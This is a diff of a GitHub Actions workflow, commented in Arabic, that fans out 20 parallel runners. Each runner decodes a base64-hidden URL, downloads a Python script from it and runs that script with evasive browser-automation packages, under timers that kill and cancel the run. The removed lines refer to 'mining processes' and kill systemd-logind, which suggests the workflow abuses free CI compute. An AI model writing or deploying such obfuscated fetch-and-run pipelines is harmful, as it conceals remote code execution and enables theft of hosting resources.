@@ -1,12 +1,12 @@
-name: Linux Autonomous Task Wing
+name: Linux Standalone Task Fleet
 
 on:
-  schedule:
-    # تشغيل تلقائي في الأوقات: 03:00، 11:00، 19:00 (توقيت UTC)
-    - cron: '0 3,11,19 * * *'
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  repository_dispatch:
+    types: [start]
 
 concurrency:
-  group: task-wing-${{ github.workflow }}-${{ github.ref }}
+  group: standalone-fleet-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,105 +15,94 @@ permissions:
 
 jobs:
   # =================================================================
-  # المراقب الزمني الشامل: يُنهي الـ workflow بكامله بعد ساعة واحدة
+  # ضابط الإيقاف الزمني: يُنهي الـ workflow كاملاً عند حد 65 دقيقة
   # =================================================================
-  temporal-warden:
-    name: "Temporal Warden"
+  cutoff-officer:
+    name: "Cutoff Officer"
     runs-on: ubuntu-latest
-    timeout-minutes: 65
+    timeout-minutes: 70
     steps:
-      - name: Activate Sweeping Time Limit
+      - name: Trigger Global Shutdown Sequence
         run: |
-          echo "[WARDEN] Temporal warden online. Every task will be swept away at the 60-minute mark."
-          echo "[WARDEN] Watching execution sequence: ${{ github.run_id }}"
+          echo "[OFFICER] Cutoff officer deployed. Total purge scheduled at the 65-minute boundary."
+          echo "[OFFICER] Tracking operation identifier: ${{ github.run_id }}"
           
-          # الانتظار حتى مرور ساعة كاملة (3600 ثانية)
-          sleep 3600
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
           
-          echo "[WARDEN] 60-minute mark breached! Issuing global sweep command..."
+          echo "[OFFICER] Boundary crossed! Releasing global shutdown sequence..."
           
-          # إرسال أمر الإلغاء الشامل إلى GitHub
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[WARDEN] Global sweep command sent successfully."
+          echo "[OFFICER] Shutdown sequence delivered. Every running and queued task will be purged."
 
   # =================================================================
-  # المهمة الرئيسية: تجهيز وتشغيل وحدات المهام
+  # المهمة الأساسية: تجهيز وإطلاق وحدات العمل
   # =================================================================
-  deploy-wing:
-    name: "WingUnit-${{ matrix.unit_slot }}"
+  launch-fleet:
+    name: "FleetUnit-${{ matrix.unit_position }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_position: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      # 【الخطوة الأولى】تأسيس الطبقة الأرضية
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      - name: Establish Ground Layer
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈١〉 تأسيس الطبقة التشغيلية
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Anchor Operating Layer
         run: |
-          echo "[GROUND] Establishing ground layer for WingUnit-${{ matrix.unit_slot }} on Linux..."
+          echo "[ANCHOR] Anchoring operating layer for FleetUnit-${{ matrix.unit_position }} on Linux..."
           sudo apt update -qq
-          sudo apt install -y cpulimit curl python3-pip
+          sudo apt install -y curl python3-pip
 
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      # 【الخطوة الثانية】جلب ملف المهمة من المصدر
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      - name: Bring Down Source Payload
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٢〉 تنزيل ملف التشغيل الرئيسي
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Secure Operating Script
         run: |
-          echo "[BRINGDOWN] Bringing down app_task.py from remote repository..."
-          SOURCE_REPO=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$SOURCE_REPO" -o app_task.py
-          echo "[BRINGDOWN] Payload landed in workspace."
+          echo "[SECURE] Securing app_task.py from designated endpoint..."
+          DESIGNATED_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DESIGNATED_ENDPOINT" -o app_task.py
+          echo "[SECURE] Operating script secured."
 
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      # 【الخطوة الثالثة】تركيب حزم بايثون الضرورية
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      - name: Attach Python Dependencies
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٣〉 تركيب المتطلبات البرمجية
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Install Programming Requirements
         run: |
-          echo "[ATTACH] Attaching Python dependency set..."
+          echo "[REQUIRE] Installing required programming packages..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      # 【الخطوة الرابعة】تشغيل المهمة تحت إشراف زمني
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      - name: Run Workload with Time Marshal
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٤〉 التشغيل تحت مراقبة زمنية (65 دقيقة)
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Operate Under Duration Watcher
         run: |
-          echo ">> Deploying workload on WingUnit-${{ matrix.unit_slot }}..."
+          echo ">> Launching workload on FleetUnit-${{ matrix.unit_position }}..."
           
-          # إطلاق السكربت في الخلفية
+          # تفعيل السكربت في الخلفية
           python3 app_task.py &
-          WING_PID=$!
+          FLEET_PID=$!
           
-          echo ">> Time marshal on watch. Expiry at 74 minutes."
+          echo ">> Duration watcher armed. Ceiling: 65 minutes (3900s)."
           
-          # الانتظار حتى نهاية المهلة المحددة
-          sleep 4440
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
           
-          # فحص حالة العملية وإنهاؤها إن كانت لا تزال قائمة
-          if kill -0 $WING_PID 2>/dev/null; then
-            echo ">> Expiry point hit! Terminating workload..."
-            kill -9 $WING_PID
-            echo ">> Workload terminated by marshal."
+          # التحقق من حالة العملية وإنهاؤها إذا لزم الأمر
+          if kill -0 $FLEET_PID 2>/dev/null; then
+            echo ">> Ceiling exceeded! Stopping workload..."
+            kill -9 $FLEET_PID
+            echo ">> Workload stopped by watcher."
           else
-            echo ">> Workload concluded before expiry."
+            echo ">> Workload ended within the ceiling."
           fi
-
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      # 【الخطوة الخامسة】تنظيف الموارد وإخراج الوحدة
-      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
-      - name: Flush and Withdraw Unit
-        run: |
-          echo "[WITHDRAW] WingUnit-${{ matrix.unit_slot }} preparing to withdraw."
-          echo "[WITHDRAW] Flushing residual cpulimit and mining processes..."
-          sudo pkill -f cpulimit || true
-          sudo pkill -f systemd-logind || true
-          echo "[WITHDRAWN] WingUnit-${{ matrix.unit_slot }} fully withdrawn."
